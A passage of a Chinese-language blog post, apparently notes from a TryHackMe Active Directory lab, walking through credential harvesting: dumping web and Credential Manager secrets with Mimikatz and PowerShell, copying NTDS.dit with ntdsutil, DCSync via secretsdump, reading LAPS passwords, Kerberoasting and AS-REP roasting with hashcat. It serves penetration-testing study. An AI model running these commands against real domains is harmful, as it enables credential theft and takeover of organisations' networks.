<span class="line"><span style="color: #E06C75">VaultCmd</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">listcreds</span><span style="color: #ABB2BF">:</span><span style="color: #98C379">&quot;Web Credentials&quot;</span></span></code></pre></div></div></figure>

<h3 id="转储凭据"><a href="#转储凭据" class="headerlink" title="转储凭据"></a>转储凭据</h3><p>VaultCmd 无法显示密码，但我们可以依靠其他 PowerShell 脚本，如  <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">Get-WebCredentials.ps1</a>，它已包含在所附的虚拟机中，执行脚本时要带上 bypass 命令。</p>
<p><code>Bypass policy</code> 指的是 PowerShell 的<strong>执行策略（Execution Policy）</strong>。</p>
<p>这是 PowerShell 的一项安全功能，旨在防止恶意脚本在未经用户许可的情况下运行。它有以下几种模式：</p>
<ul>
<li><strong>Restricted</strong>：最严格的模式，不允许任何脚本运行。</li>
<li><strong>AllSigned</strong>：只允许运行由可信发布者签名的脚本。</li>
<li><strong>RemoteSigned</strong>：允许运行自己创建的本地脚本，但要求从网上下载的脚本必须经过签名。</li>
<li><strong>Bypass</strong>：<strong>最宽松的模式</strong>，绕过所有执行策略，允许任何脚本运行，没有警告或提示。</li>
</ul>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ex bypass</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 载入模块</span></span>
<span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">C:\Tools\Get-WebCredentials.ps1</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 导出 Web 凭证</span></span>
<span class="line"><span style="color: #56B6C2">Get-WebCredentials</span></span></code></pre></div></div></figure>

<h3 id="RunAs"><a href="#RunAs" class="headerlink" title="RunAs"></a>RunAs</h3><p>可以使用保存的凭据运行 RunAs 载入凭据</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 查看保存的凭据</span></span>
<span class="line"><span style="color: #E06C75">cmdkey</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">list</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 使用 thm.</span><span style="color: #E06C75">red</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF"> 凭据运行 cmd</span></span>
<span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">savecred</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:thm.</span><span style="color: #E06C75">red</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF"> cmd.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">type </span><span style="color: #98C379">&quot;c:\Users\thm-local\Saved Games\flag.txt&quot;</span></span></code></pre></div></div></figure>

<h3 id="Mimikatz-提取密码"><a href="#Mimikatz-提取密码" class="headerlink" title="Mimikatz 提取密码"></a>Mimikatz 提取密码</h3><p>用这个就可以直接提取明文密码了</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">c:\Tools\Mimikatz\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 如果报错就用解锁 LSASS 方法跑一遍</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 导出凭据</span></span>
<span class="line"><span style="color: #ABB2BF">sekurlsa::credman</span></span></code></pre></div></div></figure>

<h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><p>这一节就讲了如何本地和远程提取域控的 Hash。</p>
<h3 id="NTDS-Domain-Controller"><a href="#NTDS-Domain-Controller" class="headerlink" title="NTDS Domain Controller"></a>NTDS Domain Controller</h3><p>新技术目录服务 (NTDS) 是一个包含所有 Active Directory 数据（包括对象、属性、凭证等）的数据库。NTDS.DTS 数据由以下三个表组成：</p>
<ul>
<li>Schema table: it contains types of objects and their relationships.</li>
<li>Link table: it contains the object’s attributes and their values.</li>
<li>Data type: It contains users and groups.</li>
</ul>
<p>NTDS 默认位于 C:\Windows\NTDS，并已加密，以防止从目标计算机提取数据。从运行的机器访问 NTDS.dit 文件是不允许的，因为该文件被 Active Directory 使用并锁定。不过，有多种方法可以访问该文件。本任务将讨论如何使用 ntdsutil 和 Diskshadow 工具获取 NTDS 文件的副本，最后讨论如何转储文件内容。需要注意的是，解密 NTDS 文件需要使用系统引导密钥来尝试解密 LSA 隔离凭据，该凭据存储在 SECURITY 文件系统中。因此，我们还必须转储包含所有解密所需文件的安全文件。</p>
<h3 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h3><p>Ntdsutil 是一款 Windows 实用程序，用于管理和维护 Active Directory 配置。它可用于各种情况，如</p>
<ul>
<li>恢复 Active Directory 中已删除的对象。</li>
<li>执行 AD 数据库维护</li>
<li>活动目录快照管理。</li>
<li>设置目录服务还原模式 (DSRM) 管理员密码。</li>
</ul>
<p>参考 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">Microsoft documentation</a>。</p>
<h3 id="本地-Dump（无凭证）"><a href="#本地-Dump（无凭证）" class="headerlink" title="本地 Dump（无凭证）"></a>本地 Dump（无凭证）</h3><p>如果您没有可用的凭证，但有域控制器的管理员访问权限，通常会这样做。因此，我们将依靠 Windows 实用程序来转储 NTDS 文件并离线破解它们。首先，我们假设自己拥有域控制器的管理员权限。<br>要成功转储 NTDS 文件的内容，我们需要以下文件：</p>
<ul>
<li>C:\Windows\NTDS\ntds.dit</li>
<li>C:\Windows\System32\config\SYSTEM</li>
<li>C:\Windows\System32\config\SECURITY</li>
</ul>
<p>下面是一条单行 PowerShell 命令，使用 Ntdsutil 工具转储 C:\temp 目录中的 NTDS 文件。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 本地导出 NTDS</span></span>
<span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #98C379">&quot;ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\temp&#39; q q&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 把文件传到自己的机器上运行 impacket 脚本</span></span>
<span class="line"><span style="color: #ABB2BF">python secretsdump.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">security </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">SECURITY </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">system </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">SYSTEM </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ntds </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ntds.dit local</span></span></code></pre></div></div></figure>

<h3 id="远程-Dump（有凭证）"><a href="#远程-Dump（有凭证）" class="headerlink" title="远程 Dump（有凭证）"></a>远程 Dump（有凭证）</h3><p>在上一节中，我们讨论了如何在没有凭证的情况下从内存中获取哈希值。在本任务中，我们将演示如何远程转储系统和域控制器哈希值，这需要密码或 NTLM 哈希值等凭证。我们还需要具有域控制器管理访问权限或特殊权限的用户的凭据。</p>
<h4 id="DC-Sync"><a href="#DC-Sync" class="headerlink" title="DC Sync"></a>DC Sync</h4><p>DC Sync 是在 Active Directory 环境中执行的一种流行攻击，用于远程转储凭据。当具有以下 AD 权限的账户（具有必要权限的特殊账户）或 AD 管理账户受到攻击时，这种攻击就会起作用：</p>
<ul>
<li>Replicating Directory Changes</li>
<li>Replicating Directory Changes All</li>
<li>Replicating Directory Changes in Filtered Set</li>
</ul>
<p>攻击者会利用这些配置来执行域复制，通常称为 “DC Sync ”或 “域控制器同步”。</p>
<p>可以用 mimikatz 工具执行 DC Sync 攻击，不过这里用 Impacket SecretsDump 远程实现。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 远程导出 NTDS 他还会导出 Kerberos 密钥</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">secretsdump.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-just-dc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THM.red/thm@10.201.48.121</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 会提示你输入密码</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 远程导出 NTLM</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">secretsdump.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-just-dc-ntlm</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THM.red/thm@10.201.48.121</span></span></code></pre></div></div></figure>

<h2 id="Local-Administrator-Password-Solution-LAPS"><a href="#Local-Administrator-Password-Solution-LAPS" class="headerlink" title="Local Administrator Password Solution (LAPS)"></a>Local Administrator Password Solution (LAPS)</h2><h3 id="组策略首选项（Group-Policy-Preferences-GPP）"><a href="#组策略首选项（Group-Policy-Preferences-GPP）" class="headerlink" title="组策略首选项（Group Policy Preferences, GPP）"></a>组策略首选项（Group Policy Preferences, GPP）</h3><p>Windows 操作系统有一个内置的管理员账户，可以通过密码访问。在拥有大量计算机的 Windows 环境中更改密码是一项挑战。因此，微软实现了一种方法，允许管理员使用组策略首选项（GPP）在所有工作站上更改本地管理员账户。</p>
<p>GPP 是一种工具，允许管理员创建包含嵌入式凭据的域策略。一旦部署了 GPP，SYSVOL 文件夹中会创建不同的 XML 文件。SYSVOL 是 Active Directory 的一个关键组件，它在 NTFS 卷上创建一个共享目录，所有经过身份验证的域用户都可以以读取权限访问。</p>
<p>问题在于，这些与 GPP 相关的 XML 文件中包含一个使用 AES-256 位加密的密码。在当时，这种加密强度被认为是足够的，直到微软<strong>不知何故在其 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">MSDN</a> 网站上发布了私钥</strong>。由于域用户可以读取 SYSVOL 文件夹的内容，因此解密存储的密码变得轻而易举。用于破解 SYSVOL 加密密码的工具之一就是 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a>。</p>
<h3 id="Local-Administrator-Password-Solution-LAPS-1"><a href="#Local-Administrator-Password-Solution-LAPS-1" class="headerlink" title="Local Administrator Password Solution (LAPS)"></a>Local Administrator Password Solution (LAPS)</h3><p>2015 年，微软不再将加密密码存储在 SYSVOL 文件夹中。他们引入了 <strong>本地管理员密码解决方案（LAPS）</strong>，这是一种更安全的远程管理本地管理员密码的方法。</p>
<p>这种新方法在 Active Directory 的计算机对象中添加了两个新的属性：<code>ms-mcs-AdmPwd</code> 和 <code>ms-mcs-AdmPwdExpirationTime</code>。<code>ms-mcs-AdmPwd</code> 属性包含本地管理员的<strong>明文密码</strong>，而 <code>ms-mcs-AdmPwdExpirationTime</code> 则包含密码的重置过期时间。LAPS 使用 <code>admpwd.dll</code> 来更改本地管理员密码并更新 <code>ms-mcs-AdmPwd</code> 的值。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 检查 LAPS 是否开启</span></span>
<span class="line"><span style="color: #ABB2BF">dir </span><span style="color: #98C379">&quot;C:\Program Files\LAPS\CSE&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 检查是否有对 AdmPwd 可用的 cmdlets</span></span>
<span class="line"><span style="color: #56B6C2">Get-Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">AdmPwd</span><span style="color: #56B6C2">*</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">CommandType     Name                              </span></span>
<span class="line"><span style="color: #56B6C2">-----------</span><span style="color: #ABB2BF">     </span><span style="color: #56B6C2">----</span><span style="color: #ABB2BF">                              </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Find-AdmPwdExtendedRights</span><span style="color: #ABB2BF">         </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Get-AdmPwdPassword</span><span style="color: #ABB2BF">                </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Reset-AdmPwdPassword</span><span style="color: #ABB2BF">              </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdAuditing</span><span style="color: #ABB2BF">                </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdComputerSelfPermission</span><span style="color: #ABB2BF">  </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdReadPasswordPermission</span><span style="color: #ABB2BF">  </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdResetPasswordPermission</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Update-AdmPwdADSchema</span></span></code></pre></div></div></figure>

<p>可以使用 <code>-Identity *</code> 参数列出所有可用的 OU。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找哪个 AD OU 拥有处理 LAPS 的 “所有扩展权限 ”属性</span></span>
<span class="line"><span style="color: #56B6C2">Find-AdmPwdExtendedRights</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity THMorg</span></span>
<span class="line"><span style="color: #ABB2BF">ObjectDN                                      ExtendedRightHolders</span></span>
<span class="line"><span style="color: #56B6C2">--------</span><span style="color: #ABB2BF">                                      </span><span style="color: #56B6C2">--------------------</span></span>
<span class="line"><span style="color: #ABB2BF">OU</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">THMorg,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">thm,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">red                       {THM\LAPsReader}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 检查组</span></span>
<span class="line"><span style="color: #ABB2BF">net groups </span><span style="color: #98C379">&quot;LAPsReader&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">Members</span></span>
<span class="line"></span>
<span class="line"><span style="color: #56B6C2">-------------------------------------------------------------------------------</span></span>
<span class="line"><span style="color: #ABB2BF">bk</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">admin</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取 bk-admin 用户权限后，可以用下面这个命令获取 LAPS 密码</span></span>
<span class="line"><span style="color: #56B6C2">Get-AdmPwdPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ComputerName creds</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">harvestin</span></span></code></pre></div></div></figure>

<p>需要注意的是，在实际的 AD 环境中，LAPS 只在特定的计算机上启用。因此，您需要枚举并找到正确的目标计算机以及正确的用户账户，才能获取 LAPS 密码。有很多脚本可以帮助实现这一点，但我们在 C:\Tool 中包含了  <a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> PowerShell 脚本，可以试用一下。</p>
<h2 id="其他攻击方式"><a href="#其他攻击方式" class="headerlink" title="其他攻击方式"></a>其他攻击方式</h2><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting 是一种常见的 AD 攻击，用于获取有助于持久性的 AD 票据。要使这种攻击奏效，攻击者必须能访问 SPN（服务主名）账户，如 IIS User、MSSQL 等。Kerberoasting 攻击涉及请求 Ticket Granting Ticket (TGT) 和 Ticket Granting Service (TGS)。这种攻击的最终目的是实现权限升级和横向网络移动。<br>让我们快速演示一下该攻击。首先，我们需要找到 SPN 账户，然后发送请求以获取 TGS 票据。我们将使用 GetUserSPNs.python 脚本从 AttackBox 执行 Kerberoasting 攻击。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># SPN 枚举</span></span>
<span class="line"><span style="color: #ABB2BF">python GetUserSPNs.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">dc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ip </span><span style="color: #D19A66">10.201</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">48.121</span><span style="color: #ABB2BF"> THM.red</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 请求 TGS 票据</span></span>
<span class="line"><span style="color: #ABB2BF">python GetUserSPNs.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">dc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ip </span><span style="color: #D19A66">10.201</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">80.121</span><span style="color: #ABB2BF"> THM.red</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm </span><span style="color: #56B6C2">-request-user</span><span style="color: #ABB2BF"> svc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">thm</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 爆破 TGS</span></span>
<span class="line"><span style="color: #ABB2BF">hashcat hash.txt rockyou.txt</span></span></code></pre></div></div></figure>

<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>AS-REP Roasting 是一种使攻击者能够检索账户选项设置为“不需要 Kerberos 预验证“的 AD 用户密码哈希值的技术。</p>
<p>该选项依赖于旧的 Kerberos 身份验证协议，该协议允许在没有密码的情况下进行身份验证。</p>
<p>获得哈希值后，我们可以尝试离线破解，最后，如果可以破解，我们就得到了密码！</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GetNPUsers.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-dc-ip</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.201</span><span style="color: #98C379">.80.121</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.red/</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-usersfile</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/users.txt</span></span></code></pre></div></div></figure>

<p>还有一些玩过的：</p>
<ul>
<li>SMB 中继</li>
<li>LLMNR &#x2F; NBNS 投毒</li>
</ul>
<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>其实主要就那几个方向，收集用户机器上的密码，比如说密码管理器，浏览器，转储 LSASS。之后呢，拿到了权限可以用 dcsync 拿下金票，那些 LAPS 不太懂，估计碰不上。</p>
<p>可以尝试使用以下工具来扫描目标机器。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/">Lazagne</a></li>
</ul>

    
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Recopec<br>
        <strong>本文链接：</strong><a href="https://blog.irec.moe/thm_ad.html" title="https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_ad.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_ad.html</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Active-Directory/" rel="tag">Active Directory</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Windows/" rel="tag">Windows</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1758806526445"></script>
  

  
      <div class="nexmoe-post-footer">
          <script src="https://giscus.app/client.js"
      data-repo="Recopec/Recopec.github.io"
      data-repo-id="R_kgDOHWxLSA"
      data-category="Announcements"
      data-category-id="DIC_kwDOHWxLSM4CYhGk"
      data-mapping="title"
      data-strict="0"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="preferred_color_scheme"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
</script>

      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Active-Directory-Basics"><span class="toc-number">2.</span> <span class="toc-text">Active Directory Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E5%9F%9F"><span class="toc-number">2.1.</span> <span class="toc-text">Windows 域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory"><span class="toc-number">2.2.</span> <span class="toc-text">Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Users-%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text">Users 用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Machines-%E6%9C%BA%E5%99%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">Machines 机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Groups-%E5%AE%89%E5%85%A8%E7%BB%84"><span class="toc-number">2.2.3.</span> <span class="toc-text">Security Groups 安全组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Organizational-Units-%E7%AE%A1%E7%90%86%E5%8D%95%E5%85%83"><span class="toc-number">2.2.4.</span> <span class="toc-text">Organizational Units 管理单元</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Groups-vs-OUs"><span class="toc-number">2.2.5.</span> <span class="toc-text">Security Groups vs OUs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86-AD"><span class="toc-number">2.3.</span> <span class="toc-text">管理 AD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E9%A2%9D%E5%A4%96%E7%9A%84-OU-%E5%92%8C%E7%94%A8%E6%88%B7"><span class="toc-number">2.3.1.</span> <span class="toc-text">删除额外的 OU 和用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE-Delegation"><span class="toc-number">2.3.2.</span> <span class="toc-text">委派 Delegation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">2.3.3.</span> <span class="toc-text">管理计算机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Group-Policies-%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">2.4.</span> <span class="toc-text">Group Policies 组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%8F%91-GPO"><span class="toc-number">2.4.1.</span> <span class="toc-text">分发 GPO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="toc-number">2.5.</span> <span class="toc-text">认证方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Authentication"><span class="toc-number">2.5.1.</span> <span class="toc-text">Kerberos Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetNTLM-Authentication"><span class="toc-number">2.5.2.</span> <span class="toc-text">NetNTLM Authentication</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trees-Forests-and-Trusts"><span class="toc-number">2.6.</span> <span class="toc-text">Trees, Forests and Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%91-Trees"><span class="toc-number">2.6.1.</span> <span class="toc-text">树 Trees</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%AE%E6%9E%97-Forests"><span class="toc-number">2.6.2.</span> <span class="toc-text">森林 Forests</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB-Trust-Relationships"><span class="toc-number">2.6.3.</span> <span class="toc-text">信任关系 Trust Relationships</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Breaching-Active-Directory"><span class="toc-number">3.</span> <span class="toc-text">Breaching Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">3.1.</span> <span class="toc-text">密码喷洒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-%E5%9B%9E%E4%BC%A0%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">LDAP 回传攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%BB%A7"><span class="toc-number">3.3.</span> <span class="toc-text">认证中继</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Message-Block-SMB"><span 